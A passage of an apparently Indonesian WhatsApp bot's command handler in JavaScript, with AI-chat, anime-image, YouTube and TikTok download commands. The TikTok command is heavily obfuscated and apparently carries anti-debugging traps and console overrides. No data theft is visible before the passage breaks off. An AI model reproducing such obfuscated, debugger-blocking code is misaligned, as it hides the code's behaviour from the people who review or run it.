            reply(mess.search)
            let gpt4 = await fetchJson(`https://aemt.me/v2/gpt4?text=${text}`)
zynX.sendMessage(m.chat, { text: gpt4.result }, { quoted: zynz })
}
break

case 'blackbox':
case 'bbox':{
if (!text) return reply(`Example : ${command} Text`)
            reply(mess.search)
            let blackbox = await fetchJson(`https://aemt.me/blackbox?text=${text}`)
zynX.sendMessage(m.chat, { text: blackbox.result }, { quoted: zynz })
}
break

case 'gemini':{
if (!text) return reply(`Example : ${command} Text`)
            reply(mess.search)
            let gemini = await fetchJson(`https://aemt.me/gemini?text=${text}`)
zynX.sendMessage(m.chat, { text: gemini.result }, { quoted: zynz })
}
break

case 'neko':
case 'waifu': {
if (isBan) return reply(mess.bann)
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Silahkan pilih *option* di bawah ini`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: wm
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"SFW","id":"${prefix + command} sfw"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"NSFW","id":"${prefix + command} nsfw"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: saluran,
                    newsletterJid: idsal,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

if (!text) await zynX.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
if (args[0] === "sfw") {
reply(mess.wait)
let res = await fetch(`https://waifu.pics/api/sfw/${command}`)
let json = await res.json()
let cap = `${mess.success}`
zynX.sendMessage(from, {image: { url: json.url },caption: cap},{ quoted:m })
} else if (args[0] === "nsfw") {
if (m.isGroup) return reply(mess.private)
reply(mess.wait)
let res = await fetch(`https://waifu.pics/api/nsfw/${command}`)
let json = await res.json()
let cap = `${mess.success}`
zynX.sendMessage(from, {image: { url: json.url },caption: cap},{ quoted:m })
}
}
break

case 'cry': 
case 'kill': 
case 'hug': 
case 'pat': 
case 'lick': 
case 'kiss': 
case 'bite': 
case 'yeet': 
case 'bully': 
case 'bonk': 
case 'wink': 
case 'poke': 
case 'nom': 
case 'slap': 
case 'smile': 
case 'wave': 
case 'awoo': 
case 'blush': 
case 'smug': 
case 'glomp': 
case 'happy': 
case 'dance': 
case 'cringe': 
case 'cuddle': 
case 'highfive': 
case 'handhold': 
reply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
zynX.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
break

case 'leave': {
if (!isCreator) return reply('Khusus Fernazerini')
if (!m.isGroup) return reply('Khusus Group')
await zynX.group (m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'ytmp3': case 'youtubemp3': {
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                reply('1 Limit Anda Terpakai')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
await loading ()
reply(mess.search)
downloadMp3(text)
}
break

case "ytreels": case "ytmp4":{
if (!text) return reply('Masukan Link Nya!!!')
await loading ()
reply(mess.search)
downloadMp4(text)
}
break

case 'tt': 
case 'tiktok':
case 'tiktokdl': {
(function(_0x2c73a5,_0x52e55f){const _0x1ec064=_0x2c73a5();function _0x42dab6(_0x4b1cb1,_0x302d6d,_0x1c1ca8,_0x435f5a,_0x5cb638){return _0x334d(_0x1c1ca8- -0xb3,_0x435f5a);}function _0x50eca2(_0x20e83e,_0x3c4238,_0x4d6add,_0x2a2d45,_0x498071){return _0x334d(_0x20e83e- -0x2da,_0x3c4238);}function _0x3f6fb7(_0x4f2f42,_0x3c18a0,_0x4d1373,_0x303c9b,_0x381a9c){return _0x334d(_0x4d1373-0x39b,_0x381a9c);}function _0x2d3a42(_0x2b8e9e,_0x34c49d,_0x29c8de,_0x45912b,_0x13f469){return _0x334d(_0x29c8de- -0x1f3,_0x2b8e9e);}function _0x21f550(_0xfb4e64,_0xf16d81,_0x5f42a1,_0xcdfe60,_0x42e95d){return _0x334d(_0xcdfe60- -0x3a0,_0xf16d81);}while(!![]){try{const _0x1ab67f=parseInt(_0x3f6fb7(0x589,0x466,0x518,0x5be,0x56b))/(-0x4d*-0x67+-0x16b5*0x1+-0x845)*(-parseInt(_0x42dab6(0xc5,0xcb,0x114,0xfd,0x195))/(-0x1614+-0x3*-0x395+0x1*0xb57))+-parseInt(_0x21f550(-0x1ab,-0x203,-0x279,-0x230,-0x221))/(0x1222+0x1a8a*0x1+0xee3*-0x3)*(parseInt(_0x3f6fb7(0x5a1,0x5f0,0x60e,0x5e0,0x5ad))/(-0x8be+-0x3*0x634+0x1*0x1b5e))+-parseInt(_0x3f6fb7(0x56d,0x65e,0x599,0x5d3,0x622))/(0x600+0x1b29*0x1+-0x2a*0xca)*(-parseInt(_0x21f550(-0x1ea,-0x143,-0x9c,-0x11b,-0x115))/(0x3*0x85e+-0x2*-0xd28+-0xd*0x3f4))+parseInt(_0x2d3a42(0x74,0xe,0x79,0xc5,-0x2d))/(0x2*0x12ff+-0x1d86+0x871*-0x1)+parseInt(_0x21f550(-0x145,-0x283,-0x19d,-0x1e0,-0x267))/(-0xb1c+0xe4b+0x327*-0x1)+parseInt(_0x2d3a42(0x10c,-0x42,0x89,-0x27,-0x46))/(-0x20d8+0x1945*0x1+0x2*0x3ce)+-parseInt(_0x21f550(-0xa7,-0x8d,-0x18a,-0x12e,-0x111))/(0xce7+-0x1b3b+0x265*0x6);if(_0x1ab67f===_0x52e55f)break;else _0x1ec064['push'](_0x1ec064['shift']());}catch(_0x337167){_0x1ec064['push'](_0x1ec064['shift']());}}}(_0x1ec0,-0x21d05+-0x46da*-0x2+0xbe851));function _0x1ec0(){const _0x4fa34b=['YvHKz','FJnye','vvLOZ','://ww','newsl','nickn','YGIcZ','$]*)','OpPoO','jLPAN','name','WCJpD','img','Name','audio','RYEVu','9440480hZKnjl','amgmf','zQFzE','okdl.','tikto','url','12252920vZAIpG','8SwWPxf','HLxNy','ACyfK','Oqgmd','VEHDj','setIn','gjBcq','cNvNC','is\x22)(','5482386bnwUTS','Messa','nkcbW','Objec','fQZVy','uiVep','pMcEc','MSCIv','INJln','2410266Wvzjgf','id\x22:\x22','logo-','conso','QMRDe','oCWbT','LUNzO','devic','excep','play_','MtztN','a-zA-','uploa','OJDJL','HyDMc','trace','dDvSe','while','oOKbm','const','eList','UpNKs','resul','rRGKy','age','mPpRc','MFnMK','vGLLj','Hmqsa','zOirO','FUQxA','onedJ','ogo-t','WThFU','ᴇ\x20:\x20*','*\x0aᴅᴇs','ltUCQ','FRJeJ','JXXgi','aud','text\x22','k-svg','ycHHz','kgvAl','lFfaP','xWFQX','Metad','tt\x20sd','cIgVD','sxkMa','eVqzD','HTOsZ','forwa','vxslk','apply','JBtIY','rsion','strin','*\x0aᴛʏᴘ','MCrIN','HKoxt','warn','ktok','https','des','JaSPE','uXfnt','Plxcm','ʀ\x20:\x20*','nPara','terva','./lib','ageId','frrzy','CNduH','rding','aNooZ','text','ujvZi','log','DnNHf','\x5c(\x20*\x5c','qhSus','WppFE','CZhnL','activ',':\x22Ima','serve','key',')+)+)','vEUCc','whuOd','CpisE','UQARp','qIdOr','ngnYI','eFlow','(((.+','ataVe','ata','state','forEa','PwzVd','RQvxG','JFmKo','Body','erCgq','IgAmM','lKbWL','rdedN','gger','ame','debu','type','VPAUi','mQtrN','push','oadTi','Score','yLFvl','NrOBO','aDdfy','ᴀᴜᴛʜᴏ','rZRUT','_repl','uEoRv','BSLpz','oadTo','YhQQl','vhvUo','chat','ZJkpu','/tikt','FLgXy','SWFoP','YtPUD','pyufu','io\x20🎵\x22','info','VXhzx','table','actio','895731RgrmiM','TKVZs','creat','VXlPa','ructo','tion','IdVEq','succe','QTKjx','butto','cuNsx','{\x22dis','TwaOl','1mRLtuz','to__','QIuEG','warde','JmXfk','wait','ASvUS','dUwfP','IBMWa','jnJhO','quote','Heade','ile-l','XTMOU','e)\x20{}','inclu','ktZhs','XUJAK','ZQVXa','FnAXd','proto','rn\x20th','fnCQL','fweVO','ing','tsxFx','giRrJ','pZdBx','0-9a-','quick','k.mp3','RhPMe','MMbIX','n\x20(fu','waUpl','bind','nstru','Serve','xEpIt','desc','test','TsqbE','msJso','NMUEc','sendM','lKfqA','VIMOt','capti','messa','sende','fileN','dLNZA','pMqgI','dbXak','Z_$][','input','evDNV','dIwrK','init','error','ogos.','_hd','ksVAg','caIiE','xoRNL','xRBhZ','Hbtse','5036944GjNKXU','LQcXu','eInfo','kdvEL','YfAfH','lOSsB','DeJvA','977066KeGJQt','QbimQ',',\x22id\x22','yEmlB','HoYbk','\x20🎬\x22,\x22','ewsle','ype','xVGBU','call','*(?:[','Nativ','oupPA','mNcQX','nuaLj','aMyRT','tterM','GTrRj','chain','isFor','ᴄ\x20:\x20*','xYzFp','NAakF','ik-to','jFNYY','ANQvs','toStr','HHQoC','lOUTy','OCJmq','w.fre','Foote','nctio','pload','keyuv','/mp4','OrcNF','le\x20:\x20','yUoTJ','SLiBL','RBAPI','pzCxe','ion\x20*','zA-Z_','Jid','remot','eo\x20SD','Inter','music','png/f','gxhRb','BIEWL','image','KMCAn','IINrQ','5WVHoMU','searc','Cfzzq','pvjUE','Downl','YCpVL','MjRJA','relay','eFAxR','retur','PSqcM','lNMxF','qeIRE','GkxuD','com/u','iSQQo','count','pftbv','\x5c+\x5c+\x20','TDbkO','hHmTH','ELeFE','TOCiL','gwhQM','-tok-','aTQoy',':\x22Vid','autho','rTRbL','mimet','vXMNZ','FFExn','video','rMess',':\x22Aud','WujdG','lgLyI','uGBpa','{}.co','XkTSZ','funct','ctor(','XfIIq','n()\x20','mpjzW','eo\x20HD','bpOHt','epngl','tt\x20au','GJTas','HYrzk','Examp','eJid','bbMCw','kfzpW','ZvBXx','essag','BPSjh','yoMbW','xysAa','mmnhW','Aeyis','KDFMi','etter','mCMel','eMess','sDIKK','-20.p','aVRvO','CpFkN','lengt','vPqal','\x20Link','SWVQH','tt\x20hd','\x22retu','ge\x20🖼️\x22','yJZYs','qUnkk','menti','CushT','fnbZH','YldUA','HxBtP','OWCgm','kIYzC','zOQVR','SJhcK','tt\x20im','s/tik','rHWbp','\x20(tru','YKPjn','__pro'];_0x1ec0=function(){return _0x4fa34b;};return _0x1ec0();}const _0x459645=(function(){const _0x469b71={'lKbWL':function(_0x279282,_0x12d539){return _0x279282(_0x12d539);},'GJTas':_0x397cfb(0x5be,0x5a2,0x631,0x51b,0x576)+_0x397cfb(0x4a9,0x56d,0x599,0x510,0x5ce)+_0x397cfb(0x6c8,0x652,0x64b,0x5a4,0x679)+')','yLFvl':_0x397cfb(0x538,0x58c,0x622,0x5a7,0x591)+_0x4b78c3(0x3fb,0x52f,0x571,0x462,0x4a6)+_0x29a77c(0x49,0x45,0xdb,0x2c,0xd9)+_0x29a77c(-0x15c,-0x6b,-0x45,-0xb1,-0x63)+_0x4b78c3(0x4f0,0x468,0x449,0x41b,0x46e)+_0x397cfb(0x50d,0x56e,0x4d4,0x562,0x4dc)+_0x29a77c(-0x53,-0xc8,0xa4,-0x1,0x74),'QMRDe':_0x327b35(0x137,0x12b,0x1c2,0x1a0,0x89),'VEHDj':function(_0x539c55,_0x79440a){return _0x539c55+_0x79440a;},'rRGKy':_0x327b35(0x159,0xe2,0x11b,0x1d1,0x1cd),'OJDJL':function(_0xe9c5e0,_0x72be5){return _0xe9c5e0+_0x72be5;},'xWFQX':_0x4b78c3(0x3dd,0x457,0x3bf,0x4bc,0x489),'aTQoy':function(_0x718395){return _0x718395();},'lFfaP':function(_0x25f0d0,_0xabf801,_0x1dbc1d){return _0x25f0d0(_0xabf801,_0x1dbc1d);},'Hbtse':function(_0x5d2f07,_0x11c645){return _0x5d2f07!==_0x11c645;},'pMcEc':_0x129455(0x160,0x1cf,0x15c,0x9d,0x17b),'QbimQ':function(_0x444daf,_0xf16e24){return _0x444daf!==_0xf16e24;},'gjBcq':_0x129455(0x1f6,0x273,0x1e4,0x2b1,0x283),'NrOBO':function(_0x577c48,_0x52a2e6){return _0x577c48(_0x52a2e6);},'zQFzE':function(_0x4e77b3,_0x1d6f18){return _0x4e77b3+_0x1d6f18;},'DeJvA':_0x129455(0xee,0x101,0x140,0x76,0xe4)+_0x129455(0x3c,0x4d,0xd7,0x190,0xee)+_0x29a77c(-0xdd,0xc,-0x41,-0x7d,0x19)+_0x4b78c3(0x593,0x490,0x4e3,0x487,0x4fe),'FLgXy':_0x397cfb(0x5a8,0x5a0,0x5b5,0x541,0x51f)+_0x29a77c(-0x16c,-0x55,-0x115,-0xc3,-0xbf)+_0x397cfb(0x5a8,0x5a3,0x5ac,0x60b,0x4f6)+_0x397cfb(0x548,0x5c5,0x610,0x544,0x590)+_0x129455(0xbe,0xf2,0xcb,-0x5,0x91)+_0x397cfb(0x55c,0x5f7,0x667,0x658,0x592)+'\x20)','SJhcK':function(_0x414bda,_0x13f9dd){return _0x414bda===_0x13f9dd;},'VIMOt':_0x29a77c(0x17,0x146,-0x2c,0x93,0xb5)};function _0x129455(_0x86e8ac,_0x3241ed,_0x534afc,_0x49a04c,_0x3a25c3){return _0x334d(_0x534afc- -0xc7,_0x49a04c);}function _0x327b35(_0x4374d9,_0x5d5149,_0x29b487,_0x32c4ab,_0x1a1949){return _0x334d(_0x4374d9- -0x80,_0x32c4ab);}function _0x397cfb(_0xaa7e19,_0x3fe815,_0x360bca,_0x1a7445,_0x2b0d63){return _0x334d(_0x3fe815-0x37c,_0x360bca);}let _0x161ca9=!![];function _0x29a77c(_0x2a5b71,_0x276e23,_0x41e1fc,_0x1f3bb0,_0x465f1d){return _0x334d(_0x1f3bb0- -0x264,_0x2a5b71);}function _0x4b78c3(_0x5bcb6a,_0x2648b4,_0x7ec7a1,_0xc25ae1,_0x35c44e){return _0x334d(_0x35c44e-0x2d5,_0x5bcb6a);}return function(_0x22865d,_0x1b1264){function _0xd4e423(_0x5a8bcc,_0x564421,_0x5498a6,_0x5809b7,_0x42e72d){return _0x29a77c(_0x5809b7,_0x564421-0x9e,_0x5498a6-0x16b,_0x5a8bcc-0x34a,_0x42e72d-0x72);}function _0x56f4b2(_0x1bd0e9,_0x2a5688,_0x48aff9,_0xb215e,_0x36d798){return _0x397cfb(_0x1bd0e9-0xff,_0x36d798- -0x2d5,_0x1bd0e9,_0xb215e-0x118,_0x36d798-0x17e);}function _0x417cf6(_0x6bd6f2,_0x21fdc9,_0xa407be,_0x52f113,_0x5df111){return _0x397cfb(_0x6bd6f2-0xef,_0x52f113-0x44,_0xa407be,_0x52f113-0x13e,_0x5df111-0xbf);}function _0x5d7395(_0x53c690,_0x97d1b8,_0x135b69,_0x1d03df,_0x3813e0){return _0x29a77c(_0x1d03df,_0x97d1b8-0x1a1,_0x135b69-0x11c,_0x3813e0-0x365,_0x3813e0-0x14b);}function _0x4b82aa(_0x2a46dd,_0x5e657f,_0x3d7d23,_0x2aac7f,_0x499963){return _0x4b78c3(_0x3d7d23,_0x5e657f-0x102,_0x3d7d23-0x118,_0x2aac7f-0x11c,_0x499963- -0xde);}if(_0x469b71[_0x4b82aa(0x51a,0x505,0x50f,0x399,0x44c)](_0x469b71[_0x4b82aa(0x320,0x30d,0x41a,0x428,0x3a2)],_0x469b71[_0x56f4b2(0x1d0,0x244,0x317,0x2cc,0x252)])){const _0x3c6c03=_0x161ca9?function(){const _0x1ccdf9={'YhQQl':function(_0x48bc43,_0x1a892f){function _0x3093ef(_0x187117,_0x4067e7,_0x4f070a,_0x4fa702,_0x479096){return _0x334d(_0x4067e7- -0x3a5,_0x4f070a);}return _0x469b71[_0x3093ef(-0x86,-0xb4,-0xd,-0x4f,-0x37)](_0x48bc43,_0x1a892f);},'HLxNy':_0x469b71[_0x17ca6e(0x54e,0x545,0x52b,0x5db,0x593)],'zOirO':_0x469b71[_0x17ca6e(0x6e8,0x6d1,0x63b,0x6db,0x660)],'mQtrN':function(_0x40f639,_0x43b3f1){function _0x322023(_0x2eedb9,_0x20cf94,_0x432d67,_0x55b34a,_0xb00f19){return _0x17ca6e(_0x2eedb9-0xa1,_0x20cf94-0xc7,_0x432d67,_0x55b34a-0x1cc,_0xb00f19- -0x511);}return _0x469b71[_0x322023(0x178,0xc6,0x100,0x10b,0x144)](_0x40f639,_0x43b3f1);},'jLPAN':_0x469b71[_0x17ca6e(0x68f,0x578,0x521,0x650,0x5ed)],'whuOd':function(_0x4f1e8f,_0x560b9c){function _0x151fe4(_0x5ee848,_0x590869,_0xd60314,_0xd097f2,_0x549f02){return _0x15b94e(_0x5ee848-0x17,_0x5ee848,_0xd60314-0x3,_0xd60314- -0x18a,_0x549f02-0x133);}return _0x469b71[_0x151fe4(0x432,0x3c2,0x3af,0x3bf,0x3f3)](_0x4f1e8f,_0x560b9c);},'pyufu':_0x469b71[_0x17ca6e(0x5e1,0x535,0x665,0x61e,0x600)],'mCMel':function(_0x35f5d5,_0xe6b7f6){function _0x425c91(_0x5cb2ef,_0x33fdd7,_0x1f74f0,_0x2a73e2,_0x34fb47){return _0x1ba221(_0x5cb2ef-0x156,_0x1f74f0- -0x147,_0x1f74f0-0x7b,_0x2a73e2,_0x34fb47-0xd3);}return _0x469b71[_0x425c91(0x1c5,0x19a,0x255,0x197,0x24f)](_0x35f5d5,_0xe6b7f6);},'TsqbE':_0x469b71[_0x57bd2d(0x5d9,0x543,0x5c3,0x60a,0x5a3)],'BSLpz':function(_0x12ef19){function _0x4d4d0f(_0x3d4bd1,_0x1c7372,_0x5201a7,_0x19418b,_0x484f0a){return _0x57bd2d(_0x3d4bd1-0xeb,_0x1c7372-0x193,_0x5201a7-0xd5,_0x484f0a- -0x18,_0x1c7372);}return _0x469b71[_0x4d4d0f(0x496,0x506,0x565,0x513,0x557)](_0x12ef19);},'ksVAg':function(_0x898aa8,_0x4246c3,_0x4f57a0){function _0x2c2009(_0x38b6dd,_0x32dff3,_0x2a7eb4,_0x11b11b,_0x2a6598){return _0x166e53(_0x38b6dd-0x77,_0x38b6dd,_0x2a7eb4-0x8a,_0x32dff3-0x128,_0x2a6598-0x3b);}return _0x469b71[_0x2c2009(0x5f2,0x623,0x5eb,0x661,0x6f1)](_0x898aa8,_0x4246c3,_0x4f57a0);}};function _0x1ba221(_0x17b450,_0x287f8a,_0x132c4c,_0x154d47,_0x75fa16){return _0x56f4b2(_0x154d47,_0x287f8a-0x129,_0x132c4c-0xe5,_0x154d47-0x13c,_0x287f8a-0x63);}function _0x57bd2d(_0x472f64,_0x2c3df4,_0x3cb1f6,_0x208b31,_0x38104e){return _0x56f4b2(_0x38104e,_0x2c3df4-0x17f,_0x3cb1f6-0x15a,_0x208b31-0x46,_0x208b31-0x2b1);}function _0x17ca6e(_0x225e1c,_0x50f8c0,_0x2b62f1,_0xe54004,_0x824752){return _0x4b82aa(_0x225e1c-0x113,_0x50f8c0-0x37,_0x2b62f1,_0xe54004-0x198,_0x824752-0x16d);}function _0x15b94e(_0x73b00d,_0x37aa54,_0x7d5494,_0x5e8d83,_0x34b556){return _0x4b82aa(_0x73b00d-0x12a,_0x37aa54-0x1ac,_0x37aa54,_0x5e8d83-0x144,_0x5e8d83-0xcb);}function _0x166e53(_0x58906b,_0x4bc78f,_0x29739e,_0x2a93dc,_0x31184b){return _0x56f4b2(_0x4bc78f,_0x4bc78f-0x168,_0x29739e-0x4b,_0x2a93dc-0x184,_0x2a93dc-0x1a3);}if(_0x469b71[_0x17ca6e(0x522,0x5a3,0x5f2,0x466,0x523)](_0x469b71[_0x166e53(0x411,0x4bd,0x498,0x4cc,0x59b)],_0x469b71[_0x1ba221(0x415,0x38c,0x385,0x340,0x3ea)])){_0x1ccdf9[_0x15b94e(0x487,0x448,0x404,0x424,0x45e)](_0x5d7ce7,_0x1c419a[_0x166e53(0x314,0x419,0x3c6,0x3cc,0x30b)]);const _0x312c02={};_0x312c02[_0x57bd2d(0x52c,0x53c,0x5e3,0x5c9,0x5d1)]=_0x978841[_0x17ca6e(0x61f,0x5c9,0x59f,0x5e9,0x5ff)+'t'][_0x17ca6e(0x587,0x5dc,0x5bf,0x4f0,0x582)+_0x57bd2d(0x548,0x494,0x522,0x512,0x4ef)];const _0x366e22={};_0x366e22[_0x57bd2d(0x4de,0x500,0x525,0x576,0x50b)]=_0x312c02,_0x366e22[_0x17ca6e(0x4ce,0x4d3,0x4b6,0x54d,0x510)+'on']=_0x154a7d[_0x57bd2d(0x485,0x57a,0x41d,0x4cf,0x574)+'ss'];const _0x5326f3={};_0x5326f3[_0x1ba221(0x1ea,0x291,0x354,0x32a,0x2bb)+'d']=_0x501deb,_0x3ef9e5[_0x17ca6e(0x474,0x4c9,0x537,0x526,0x50d)+_0x15b94e(0x471,0x4d0,0x4f1,0x4f8,0x4dc)+'e'](_0x437476[_0x166e53(0x31d,0x34f,0x368,0x3ae,0x36b)],_0x366e22,_0x5326f3);}else{if(_0x1b1264){if(_0x469b71[_0x17ca6e(0x57f,0x464,0x4ef,0x5bb,0x52c)](_0x469b71[_0x57bd2d(0x504,0x661,0x5f9,0x5d1,0x524)],_0x469b71[_0x15b94e(0x4a4,0x4c7,0x57a,0x53b,0x5ba)]))_0x1ccdf9[_0x166e53(0x454,0x426,0x3ce,0x405,0x33c)](_0x477b46,this,function(){const _0x3c9053=new _0x270096(_0x1ccdf9[_0x253200(0x2bd,0x2cc,0x2fd,0x28b,0x321)]);function _0x1b775d(_0x2d60f3,_0x5010ea,_0x43c80d,_0x803de0,_0x3feed3){return _0x17ca6e(_0x2d60f3-0x145,_0x5010ea-0x1b,_0x43c80d,_0x803de0-0xf3,_0x803de0- -0x5c2);}const _0x3804ad=new _0x376242(_0x1ccdf9[_0x18554e(0x3ca,0x3ee,0x477,0x410,0x4a0)],'i');function _0x18554e(_0x3a499a,_0x276113,_0x2ae68b,_0x3855d7,_0x5211a3){return _0x57bd2d(_0x3a499a-0x16,_0x276113-0x114,_0x2ae68b-0x125,_0x276113- -0x20c,_0x3855d7);}function _0x1bd2d3(_0x3277cf,_0x1584c4,_0x133e82,_0x481582,_0x220d3c){return _0x15b94e(_0x3277cf-0x96,_0x3277cf,_0x133e82-0x8,_0x133e82- -0x53,_0x220d3c-0xe1);}function _0x380d72(_0x114ec5,_0x1a603b,_0x101958,_0x39b648,_0x57404d){return _0x17ca6e(_0x114ec5-0x88,_0x1a603b-0x46,_0x101958,_0x39b648-0x89,_0x114ec5- -0x244);}function _0x253200(_0x4a5080,_0x548f0a,_0x3b3b27,_0x29507d,_0x27771c){return _0x166e53(_0x4a5080-0xf4,_0x3b3b27,_0x3b3b27-0x1b6,_0x548f0a- -0x1f2,_0x27771c-0x1ab);}const _0x3059d2=_0x1ccdf9[_0x18554e(0x4d4,0x444,0x462,0x4d2,0x38f)](_0x465956,_0x1ccdf9[_0x253200(0x266,0x2bd,0x2f8,0x357,0x380)]);!_0x3c9053[_0x1bd2d3(0x417,0x47a,0x414,0x3a8,0x48f)](_0x1ccdf9[_0x253200(0x2cf,0x338,0x371,0x3f0,0x2d0)](_0x3059d2,_0x1ccdf9[_0x1bd2d3(0x39e,0x3c2,0x3d9,0x361,0x443)]))||!_0x3804ad[_0x18554e(0x2f1,0x2f1,0x33f,0x31c,0x2af)](_0x1ccdf9[_0x380d72(0x35e,0x40a,0x3c2,0x2b1,0x341)](_0x3059d2,_0x1ccdf9[_0x18554e(0x3bc,0x2f2,0x2c2,0x3a3,0x2cf)]))?_0x1ccdf9[_0x253200(0x152,0x1ba,0xe9,0x158,0x161)](_0x3059d2,'0'):_0x1ccdf9[_0x18554e(0x285,0x2ac,0x2c3,0x349,0x24f)](_0x5a4549);})();else{const _0x2a5b99=_0x1b1264[_0x17ca6e(0x66b,0x63e,0x62a,0x59c,0x61f)](_0x22865d,arguments);return _0x1b1264=null,_0x2a5b99;}}}}:function(){};return _0x161ca9=![],_0x3c6c03;}else _0x13645f=_0x469b71[_0xd4e423(0x3e3,0x4a8,0x3d4,0x3f6,0x40b)](_0x1c4212,_0x469b71[_0x417cf6(0x6ba,0x5a0,0x640,0x652,0x64a)](_0x469b71[_0xd4e423(0x354,0x410,0x2ff,0x399,0x3a3)](_0x469b71[_0xd4e423(0x2ac,0x1f5,0x2ad,0x329,0x226)],_0x469b71[_0x4b82aa(0x3eb,0x397,0x383,0x307,0x35e)]),');'))();};}()),_0x193c93=_0x459645(this,function(){const _0x8d3647={};function _0x601b7f(_0x456851,_0x5ab384,_0x4b0188,_0x5f0673,_0x458170){return _0x334d(_0x456851-0x1f6,_0x458170);}_0x8d3647[_0x52cae3(0x604,0x647,0x683,0x61c,0x562)]=_0x601b7f(0x4dc,0x521,0x524,0x4c2,0x470)+_0x28d46e(-0x10a,-0x73,0xf,0x39,-0xdf)+'+$';function _0x28d46e(_0x10538a,_0x2bf2ff,_0x5bc508,_0x224a45,_0x2576ad){return _0x334d(_0x2bf2ff- -0x351,_0x224a45);}function _0x5349da(_0x1a9c74,_0x585acf,_0xf7d01b,_0x4db0ec,_0x3c7c70){return _0x334d(_0x585acf- -0x3e2,_0x4db0ec);}const _0x18a8e1=_0x8d3647;function _0x419778(_0x4973a2,_0x552fd4,_0x5e8a28,_0x32db2e,_0x534ee2){return _0x334d(_0x534ee2-0x2fd,_0x4973a2);}function _0x52cae3(_0x5948d5,_0x56491a,_0x41dc29,_0x44bd35,_0x7ba222){return _0x334d(_0x5948d5-0x335,_0x56491a);}return _0x193c93[_0x419778(0x411,0x572,0x505,0x599,0x4de)+_0x5349da(-0x235,-0x24d,-0x200,-0x1d7,-0x26c)]()[_0x52cae3(0x534,0x567,0x5fb,0x545,0x4a0)+'h'](_0x18a8e1[_0x601b7f(0x4c5,0x550,0x516,0x4da,0x3f4)])[_0x28d46e(-0x172,-0x170,-0xbe,-0x12e,-0x22f)+_0x28d46e(-0x15a,-0x1bc,-0x278,-0x138,-0x257)]()[_0x601b7f(0x48e,0x427,0x552,0x542,0x471)+_0x28d46e(-0x294,-0x1dd,-0x291,-0x1d0,-0x219)+'r'](_0x193c93)[_0x419778(0x452,0x548,0x437,0x512,0x4fc)+'h'](_0x18a8e1[_0x419778(0x659,0x66f,0x606,0x5f0,0x5cc)]);});function _0x8633e8(_0x40a86b,_0x5017ba,_0xd9a64e,_0x27d893,_0x212309){return _0x334d(_0x40a86b- -0x153,_0xd9a64e);}_0x193c93();const _0x509b55=(function(){function _0x38d448(_0x3ea084,_0x45c6ed,_0x2949fc,_0x45b946,_0x4c14fc){return _0x334d(_0x45b946- -0x2b3,_0x3ea084);}const _0x264e63={};_0x264e63[_0x25d3f2(-0x235,-0x2be,-0x19e,-0x24b,-0x266)]=function(_0x524adf,_0x3eb352){return _0x524adf+_0x3eb352;},_0x264e63[_0x31e52b(-0x9d,-0x2f,0x5,-0x45,-0x9b)]=_0x31e52b(0x9e,-0x35,0x8d,0x124,0x6e),_0x264e63[_0x415510(0x1f2,0x12d,0x27d,0x13c,0x1f9)]=_0x38d448(-0x22,0xec,0x28,0x40,0x3e),_0x264e63[_0x25d3f2(-0x1b3,-0x14c,-0x16a,-0x1ae,-0xfb)]=_0x25d3f2(-0xd2,-0x3e,-0x119,-0x18e,-0x100)+_0x38d448(-0x28,-0x8a,-0xc5,-0x34,-0x5)+'t',_0x264e63[_0x38d448(0x43,-0x91,-0x78,-0x15,0x83)]=function(_0xcd5d72,_0x184605){return _0xcd5d72!==_0x184605;};function _0x62c0fd(_0x3b2c35,_0x568ce8,_0x3c6a35,_0x58bc16,_0x7a4b8a){return _0x334d(_0x7a4b8a- -0x8a,_0x568ce8);}function _0x31e52b(_0x1423b4,_0x90c5c0,_0x265e78,_0x4b9fa3,_0x269845){return _0x334d(_0x265e78- -0x268,_0x269845);}_0x264e63[_0x38d448(-0x35,0xae,0x47,0xe,0xcc)]=_0x38d448(-0x15b,-0x7a,-0x9f,-0xa1,-0x85);function _0x415510(_0x1d8222,_0xe2c98f,_0x18825f,_0x56ad30,_0x47e34c){return _0x334d(_0x1d8222- -0xfd,_0x56ad30);}_0x264e63[_0x31e52b(0x4d,0x54,-0x55,-0xd3,-0xab)]=function(_0x413648,_0x3edac0){return _0x413648===_0x3edac0;},_0x264e63[_0x415510(0x1e2,0x1e7,0x199,0x1a3,0x28d)]=_0x25d3f2(-0x256,-0x1a8,-0x1af,-0x1f6,-0x1ae);function _0x25d3f2(_0x5e7936,_0x257c6b,_0x23375f,_0x437cad,_0x558d35){return _0x334d(_0x5e7936- -0x3bb,_0x558d35);}_0x264e63[_0x38d448(-0xe1,-0x14b,-0x108,-0xc3,-0x17c)]=_0x62c0fd(0x2ad,0x2aa,0x27d,0x2f4,0x25c)+_0x38d448(-0x29,-0x54,0x9d,0x2b,0x75)+'+$',_0x264e63[_0x38d448(-0x36,-0x145,-0xa9,-0x7c,-0x98)]=_0x62c0fd(0x211,0x198,0x1f0,0x144,0x1f6),_0x264e63[_0x415510(0x145,0x1db,0x115,0x1b0,0x1a6)]=_0x25d3f2(-0xcb,-0x119,-0x61,-0x90,-0x150);const _0x506733=_0x264e63;let 